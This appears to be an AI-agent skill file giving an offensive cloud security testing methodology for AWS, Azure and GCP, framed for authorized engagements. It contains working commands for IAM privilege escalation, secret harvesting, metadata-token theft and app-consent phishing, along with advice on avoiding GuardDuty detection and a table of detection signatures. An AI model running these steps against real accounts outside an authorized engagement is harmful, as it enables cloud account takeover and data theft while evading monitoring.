---
name: cloud-security-technique
description: "Auth assessment: cloud security methodology; AWS/Azure/GCP IAM, storage, metadata, containers, serverless, workload identity, evidence routing."
license: MIT
compatibility: "AWS, Azure, GCP cloud environments; authorized engagements only; Requires provider CLI tools (aws-cli, az, gcloud) or in-workload shell access."
metadata:
  author: AeonDave
  version: "1.1"
  category: offensive-techniques
  language: multi
---

# Cloud Security Technique

Goal: from **cloud credential, account ID, or workload shell** to **maximum demonstrated impact** within the authorized cloud scope.

## When this technique applies

- Valid cloud provider credentials (AWS IAM keys, Azure service principal, GCP service account key).
- Shell access inside a cloud workload (EC2, VM, container, Lambda, Cloud Function).
- Cloud account ID or organization name for passive enumeration.
- Need to assess cloud-specific attack paths: IAM privilege escalation, storage exposure, metadata service abuse, container escape, cross-account pivot.

## Boundary

- **Input from `recon-technique`**: cloud asset discovery (bucket names, subdomain patterns, provider prefix lists).
- **Input from `post-exploit-technique`**: shell on cloud workload, harvested cloud credentials.
- **Web application exploitation in cloud**: use `web-exploit-technique` (SSRF to metadata, API auth bypass).
- **Deep container escape chains**: this skill covers the common primitives; for kernel-level escape development use `offensive-coding/linux-internals-dev/`.
- **Cracking cloud credentials**: use `cracking-technique`.

## Initial triage

Before enumerating broadly, classify the cloud entry point and map it to the smallest high-signal decision path.

- **Starting state**: do you have cloud credentials, a workload shell, a metadata-access path, or only passive identifiers such as account ID, org name, or bucket names?
- **First questions**: which provider is in play, what identity are you operating as, what scope boundary applies (account, subscription, project, org), and is the best next step IAM enumeration, workload abuse, or passive discovery?
- **Immediate actions**: identify the current principal or workload role, confirm scope, then enumerate only the permissions and services needed to rank privilege-escalation and data-access paths.
- **Tool-family direction**: use provider CLI/tool skills first (`aws-cli`, `gcloud-cli`, Azure CLI-equivalent workflow, `pacu`) for identity and permission mapping; use storage/service skills after permissions are known; use workload and container references only when the foothold is inside compute.
- **Escalation rule**: prefer reversible proof of privilege or data access before creating infrastructure or modifying IAM state.

## Agent operating model

```
Entry point classification:
  A. Cloud credentials (keys, tokens, service principals) → Phase 1 → Phase 2
  B. Shell in cloud workload (EC2/VM/container/Lambda) → Phase 3 → Phase 1
  C. Account ID / org name only (no creds) → Phase 4 (passive enum)

Loop:
  1. IAM enumeration — map permissions and privilege escalation paths.
  2. Storage and service abuse — find exposed data and exploitable services.
  3. Workload exploitation — metadata service, container escape, serverless injection.
  4. Cross-account pivot — role assumption, trust relationships, organization traversal.
  5. Impact demonstration — data access, persistence, privilege escalation proof.
```

---

## Phase 1 — IAM enumeration and privilege escalation

Map what the current identity can do before attempting escalation.

### AWS IAM

```bash
# Who am I?
aws sts get-caller-identity

# List attached policies
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>

# List inline policies
aws iam get-user-policy --user-name <user> --policy-name <policy>

# List groups and their policies
aws iam list-groups-for-user --user-name <user>
aws iam list-attached-group-policies --group-name <group>

# List roles the user can assume
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument]'

# Check permissions boundary
aws iam get-user --user-name <user> --query 'User.PermissionsBoundary'

# Enumerate all actions allowed (use PMapper or enumerate-iam)
enumerate-iam --access-key <AK> --secret-key <SK>
```

**AWS IAM privilege escalation — complete path matrix (31+ confirmed paths):**

| Permission | Escalation method |
|---|---|
| `iam:CreatePolicyVersion` | Create new policy version with AdministratorAccess |
| `iam:SetDefaultPolicyVersion` | Restore an older, more permissive version |
| `iam:AttachUserPolicy` / `iam:AttachRolePolicy` / `iam:AttachGroupPolicy` | Attach AdminPolicy to self/role/group |
| `iam:PutUserPolicy` / `iam:PutRolePolicy` / `iam:PutGroupPolicy` | Inject inline admin policy |
| `iam:AddUserToGroup` | Join an admin group |
| `iam:UpdateAssumeRolePolicy` + `sts:AssumeRole` | Allow yourself to assume any role |
| `iam:CreateAccessKey` on another user | Create keys for a high-privilege user |
| `iam:CreateLoginProfile` / `iam:UpdateLoginProfile` | Console access for any user |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with high-privilege instance profile → query IMDS |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Lambda function with high-priv role |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:CreateEventSourceMapping` | Lambda triggered via DynamoDB stream |
| `lambda:UpdateFunctionCode` | Overwrite existing Lambda with high-priv role |
| `iam:PassRole` + `glue:CreateDevEndpoint` | Glue endpoint SSH → credentials via IMDS |
| `glue:UpdateDevEndpoint` | Inject SSH key into existing endpoint |
| `iam:PassRole` + `cloudformation:CreateStack` | CloudFormation stack runs code with passed role |
| `cloudformation:UpdateStack` | Update existing stack to execute arbitrary code |
| `iam:PassRole` + `datapipeline:CreatePipeline` + `datapipeline:PutPipelineDefinition` | Data Pipeline with high-priv role |
| `iam:PassRole` + `codebuild:CreateProject` | CodeBuild project executes arbitrary commands with role |
| `iam:PassRole` + `sagemaker:CreateNotebookInstance` | SageMaker notebook queries IMDS |
| `sagemaker:CreatePresignedNotebookInstanceUrl` | Get signed URL for existing notebook |
| `ssm:SendCommand` on EC2 | Run commands on instance (no SSH needed) |
| `ssm:StartSession` on EC2 | Interactive shell via SSM |
| `ec2instanceconnect:SendSSHPublicKey` | Push ephemeral SSH key to EC2 |
| `sts:AssumeRole` | Direct role assumption if trust allows |

**Key tool:** `pacu` (offensive AWS framework), `enumerate-iam`, PMapper, Cloudsplaining for automated path finding.

**OIDC / Workload Identity Federation abuse (modern vector):**
- If OIDC providers are configured (GitHub Actions, GitLab CI, Kubernetes), check for overly broad `Condition` on trust policies.
- A permissive `sub` wildcard (`token.actions.githubusercontent.com:sub: repo:org/*`) allows any repo in the org to assume the role.
- Enumerate OIDC providers: `aws iam list-open-id-connect-providers`
- Check trust policy condition: `aws iam get-role --role-name <role> --query 'Role.AssumeRolePolicyDocument'`

### Azure / Entra ID

```bash
# Who am I?
az account show
az ad signed-in-user show

# List RBAC assignments
az role assignment list --assignee <user> --all

# List all roles
az role definition list --query "[].{name:name, roleName:roleName}"

# Check Entra ID roles
az rest --method GET --uri "https://graph.microsoft.com/v1.0/users/<user-id>/memberOf"

# Enumerate subscriptions
az account list --output table

# Managed identity check
az vm show --name <vm> --resource-group <rg> --query identity
```

**Azure privilege escalation paths:**
- `Microsoft.Authorization/roleAssignments/write` → grant yourself Subscription Owner.
- Managed Identity on VM with Contributor/Owner → query IMDS for OAuth token → full subscription control.
  ```bash
  # From inside a VM with Managed Identity
  az login --identity
  az role assignment list --assignee $(az account list --query '[0].id' -o tsv) --all
  # Or via IMDS directly
  curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
  ```
- `Microsoft.Compute/virtualMachines/runCommand/action` → execute commands on any VM with contributor rights.
- Automation Account Runbook with high-privilege RunAs account → contributor can create and run runbooks to escalate.
- Service Principal with `Application.ReadWrite.All` → add credentials to any app registration → impersonate app with its permissions.
- Service Principal with `AppRoleAssignment.ReadWrite.All` + `RoleManagement.ReadWrite.Directory` → grant Global Admin to a controlled SP.
- App Consent Phishing: create multi-tenant app requesting `Mail.Read`, `Files.ReadWrite.All`, `User.ReadWrite.All`, target admin for consent → persistent access without credentials.

**Enumerate Entra ID (Azure AD) roles:**
```bash
az rest --method GET \
  --uri 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$expand=principal,roleDefinition'
```

**Key tools:** `MicroBurst` (Azure subdomain enum + storage enum), `AzureHound` (BloodHound for Azure), `GraphRunner` (Graph API abuse).

### GCP IAM

```bash
# Who am I?
gcloud auth list
gcloud config list

# List IAM policies at project level
gcloud projects get-iam-policy <project-id>

# Test specific permission
gcloud projects get-iam-policy <project-id> --flatten="bindings[].members" --format="table(bindings.role)"

# List service accounts
gcloud iam service-accounts list

# Check if current SA can impersonate others
gcloud iam service-accounts get-iam-policy <sa>@<project>.iam.gserviceaccount.com
```

**GCP privilege escalation paths:**
- `iam.serviceAccounts.actAs` → impersonate any service account via `--impersonate-service-account`.
- `iam.serviceAccountKeys.create` → create a persistent key for a high-privilege SA.
- `iam.roles.update` → add permissions to a custom role you own.
- `compute.instances.setServiceAccount` → replace instance SA with a higher-privilege one.
- `cloudfunctions.functions.create` + `iam.serviceAccounts.actAs` → Cloud Function with high-priv SA.
- `iam.serviceAccounts.implicitDelegation` → chain service account impersonation.
- Workload Identity Federation: check if external OIDC providers (GitHub, GitLab) are trusted with overly broad attribute mappings.
  ```bash
  # List workload identity pools
  gcloud iam workload-identity-pools list --location=global
  gcloud iam workload-identity-pools providers list --workload-identity-pool=<pool> --location=global
  ```

**Key tools:** `gcp_scanner`, `GCPBucketBrute`, `ScoutSuite` for GCP.

---

## Phase 1b — Secrets and environment variable harvesting

Secrets frequently leak through cloud-native mechanisms before IAM escalation is needed.

```bash
# AWS: EC2 User Data (often contains bootstrap secrets)
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData \
  --query 'UserData.Value' --output text | base64 -d

# AWS: Lambda environment variables
aws lambda get-function-configuration --function-name <name> \
  --query 'Environment.Variables'

# AWS: Elastic Beanstalk environment properties
aws elasticbeanstalk describe-configuration-settings \
  --application-name <app> --environment-name <env> \
  --query 'ConfigurationSettings[].OptionSettings[?Namespace==`aws:elasticbeanstalk:application:environment`]'

# AWS: ECS task definition environment variables
aws ecs describe-task-definition --task-definition <name> \
  --query 'taskDefinition.containerDefinitions[].environment'

# AWS: Systems Manager Parameter Store
aws ssm describe-parameters
aws ssm get-parameters-by-path --path / --recursive --with-decryption

# AWS: Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <arn>

# AWS: SNS — subscribe to topics to observe messages (check for API keys in event payloads)
aws sns list-topics
aws sns subscribe --topic-arn <arn> --protocol email --notification-endpoint <your@email>

# Azure: Key Vault secrets
az keyvault list
az keyvault secret list --vault-name <vault>
az keyvault secret show --name <name> --vault-name <vault>

# GCP: Secret Manager
gcloud secrets list
gcloud secrets versions access latest --secret=<name>
```

### AWS service-specific data checks

Use these after IAM enumeration shows corresponding read permissions. Keep reads bounded: sample enough to prove access, then stop unless broader collection is explicitly authorized.

#### Cognito Identity Pools

**Risk:** `AllowUnauthenticatedIdentities: true` plus an over-permissive unauth role allows anyone with the pool ID to obtain temporary AWS credentials.

```bash
# With current AWS credentials, if list/describe is allowed:
aws cognito-identity list-identity-pools --max-results 60
aws cognito-identity describe-identity-pool --identity-pool-id <region:uuid>

# With a known identity pool ID from app config/source:
ID=$(aws cognito-identity get-id \
  --identity-pool-id <region:uuid> \
  --no-sign-request \
  --query 'IdentityId' --output text)
aws cognito-identity get-credentials-for-identity \
  --identity-id "$ID" \
  --no-sign-request
```

#### DynamoDB

**Risk:** `dynamodb:Scan` or broad `dynamodb:Query` can expose credentials, PII, tokens, and application state.

```bash
aws dynamodb list-tables
aws dynamodb describe-table --table-name <table>
aws dynamodb scan --table-name <table> --limit 25
```

#### SQS

**Risk:** Queue and dead-letter messages often contain credentials, session tokens, API keys, or sensitive job payloads. `ReceiveMessage` can affect visibility, so keep the visibility timeout minimal for proof.

```bash
aws sqs list-queues
aws sqs get-queue-attributes --queue-url <url> --attribute-names All
aws sqs receive-message --queue-url <url> --max-number-of-messages 10 --visibility-timeout 0
```

#### ECS

**Risk:** Task definitions expose environment variables, secret references, container images, and IAM role assignments. `RunTask` or task-definition mutation is an escalation step and needs explicit authorization.

```bash
aws ecs list-clusters
aws ecs list-task-definitions
aws ecs describe-task-definition --task-definition <family:revision>
```

#### API Gateway

**Risk:** Management API access reveals endpoints, stages, integrations, and API keys. Request API key values only when needed to prove impact.

```bash
aws apigateway get-rest-apis
aws apigatewayv2 get-apis
aws apigateway get-api-keys
aws apigateway get-api-key --api-key <id> --include-value
```

#### CloudTrail

**Risk:** Read access reveals prior API activity, high-value principals, and sensitive operations such as `AssumeRole`, `GetSecretValue`, and `Decrypt`.

```bash
aws cloudtrail describe-trails
aws cloudtrail lookup-events --max-results 50
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --max-results 50
```

---

## Phase 2 — Storage and service abuse

### AWS S3

```bash
# List buckets (if s3:ListAllMyBuckets allowed)
aws s3 ls

# Enumerate bucket contents
aws s3 ls s3://<bucket-name> --no-sign-request   # public bucket
aws s3 ls s3://<bucket-name>                      # authenticated

# Check bucket policy
aws s3api get-bucket-policy --bucket <bucket-name>
aws s3api get-bucket-acl --bucket <bucket-name>

# Check if bucket allows write
echo "test" | aws s3 cp - s3://<bucket-name>/test.txt

# Enumerate via tools
s3scanner scan --bucket <bucket-name>
```

### Azure Blob Storage

```bash
# List storage accounts
az storage account list

# Enumerate blobs (public container)
az storage blob list --account-name <account> --container-name <container> --auth-mode anonymous

# Check SAS tokens in URLs
# Look for: ?sv=...&se=...&sig=... in URLs
```

### GCP Storage

```bash
# List buckets
gsutil ls

# Enumerate public bucket
gsutil ls gs://<bucket-name>

# Check IAM on bucket
gsutil iam get gs://<bucket-name>
```

---

## Phase 3 — Workload exploitation

### Metadata service

```bash
# AWS IMDSv1 (no hop limit)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Azure IMDS
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Container escape primitives

See `references/container-escape.md` for full methodology. Quick triage:

```bash
# Check for privileged mode
capsh --print | grep -i sys_admin

# Check for Docker socket
ls -la /var/run/docker.sock

# Check for hostPath mounts
mount | grep -E "^/dev|^/proc|/host"

# Check for hostPID
ps -ef | grep -v "^root" | head -5

# Check service account permissions
kubectl auth can-i --list 2>/dev/null
```

### Serverless (Lambda / Cloud Functions)

```bash
# List functions (AWS)
aws lambda list-functions

# Get function environment variables (may contain secrets)
aws lambda get-function-configuration --function-name <name>

# Invoke function with crafted event
aws lambda invoke --function-name <name> --payload file://event.json output.txt

# Update function code to exfiltrate role credentials (if lambda:UpdateFunctionCode)
import boto3, os, json
def lambda_handler(event, context):
    sts = boto3.client('sts')
    return sts.get_caller_identity()  # Replace with desired action
```

### CodeBuild / SageMaker / Glue escalation targets

```bash
# CodeBuild: create project with high-priv role (if iam:PassRole + codebuild:CreateProject)
aws codebuild create-project \
  --name my-project \
  --source type=NO_SOURCE,buildspec="version: 0.2\nphases:\n  build:\n    commands:\n      - aws sts get-caller-identity" \
  --artifacts type=NO_ARTIFACTS \
  --service-role <high-priv-role-arn> \
  --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:5.0
aws codebuild start-build --project-name my-project

# SageMaker: get presigned URL for existing notebook (if sagemaker:CreatePresignedNotebookInstanceUrl)
aws sagemaker create-presigned-notebook-instance-url \
  --notebook-instance-name <name>

# Glue: update dev endpoint SSH key (if glue:UpdateDevEndpoint)
aws glue update-dev-endpoint \
  --endpoint-name <name> \
  --public-key file://~/.ssh/id_rsa.pub
```

---

## Phase 4 — Passive cloud enumeration (no credentials)

```bash
# Bucket enumeration
s3scanner scan --bucket <target>
gcp-bucket-scanner <target>

# CT log search for cloud subdomains
# Search: target.s3.amazonaws.com, target.blob.core.windows.net, target.storage.googleapis.com

# Cloud provider prefix lists
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://download.microsoft.com/download/.../ServiceTags_Public_<date>.json
# GCP: https://www.gstatic.com/ipranges/cloud.json
```

---

## Detection signatures

| Cloud | API call / event | Attack it reveals |
|-------|-----------------|-------------------|
| AWS | `iam:CreatePolicyVersion` | Policy-version escalation |
| AWS | `iam:AttachUserPolicy` / `iam:PutUserPolicy` | Direct policy attachment |
| AWS | `iam:CreateAccessKey` on another user | Key creation for lateral move |
| AWS | `iam:UpdateLoginProfile` on another user | Console password hijack |
| AWS | `s3:GetObject` high volume or `s3:ListBucket` on multiple buckets | Storage enumeration |
| AWS | `ec2:RunInstances` with `IamInstanceProfile` (non-standard role) | PassRole → EC2 escalation |
| AWS | `lambda:UpdateFunctionCode` | Lambda code injection |
| AWS | `ssm:SendCommand` / `ssm:StartSession` | No-SSH lateral movement |
| AWS | `sts:AssumeRole` from unexpected principal | Cross-account pivot |
| AWS | `secretsmanager:GetSecretValue` / `ssm:GetParameters` (new principal) | Secrets harvest |
| AWS | EC2 IMDS credentials used outside the instance (GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration) | Credential exfiltration |
| Azure | `Microsoft.Authorization/roleAssignments/write` | RBAC escalation |
| Azure | `Microsoft.KeyVault/vaults/secrets/read` | Key Vault enumeration |
| Azure | `Microsoft.Compute/virtualMachines/runCommand/action` | VM command execution |
| Azure | Managed Identity sign-in from unexpected IP | Managed Identity abuse |
| Azure | App role assignment for high-privilege Graph permission | Service Principal escalation |
| GCP | `iam.serviceAccountKeys.create` | SA key theft |
| GCP | `compute.instances.setServiceAccount` | Privilege escalation |
| GCP | `cloudfunctions.functions.create` with high-priv SA | Serverless escalation |

## Quality gates

- IAM permissions enumerated before any escalation attempt.
- Metadata service accessed only from within the workload (not externally) — credentials used via IMDS stay on the instance to avoid GuardDuty detection.
- Secrets harvest: read the minimum secret needed to prove access; do not dump entire Secrets Manager or Parameter Store.
- Container escape: primitive confirmed before attempting breakout.
- Cross-account pivot: trust relationship verified before role assumption.
- OIDC/Workload Identity: confirm overly-broad condition before exploitation.
- All escalation steps documented with exact CLI commands and timestamps.

## Anti-patterns

- Running `enumerate-iam` against production without rate limiting → API throttling / CloudTrail flood.
- Exfiltrating IMDS credentials and using them from your attacker host → GuardDuty `InstanceCredentialExfiltration` alert fires immediately.
- Assuming every S3 bucket is public → verify ACL and bucket policy first; list before reading.
- Treating IMDSv2 as "secure" without checking hop limit — a misconfigured hop limit of `>1` allows forwarding through SSRF.
- Deploying privileged DaemonSets or new workloads in shared clusters without explicit authorization.
- Using root account credentials when IAM user/role credentials are sufficient.
- Dumping entire Secrets Manager or Parameter Store when read access on a specific path proves the finding.
- Invoking destructive Lambda functions or running CloudFormation stack updates without read-only PoC option.

## Resources

- `references/container-escape.md` — full container/K8s escape methodology: posture enumeration, escape primitive scoring, common techniques (cgroup, Docker socket, hostPath, kubelet API), K8s SA pivot, cloud metadata pivot, and safety rules.
- `references/cloud-iam-escalation.md` — detailed IAM privilege escalation paths per provider with exact CLI commands and detection signatures.
- `references/subdomain-takeover.md` — subdomain takeover discovery and validation: CNAME fingerprinting for deprovisioned cloud services, automated validation with subjack/nuclei, and validation rules.
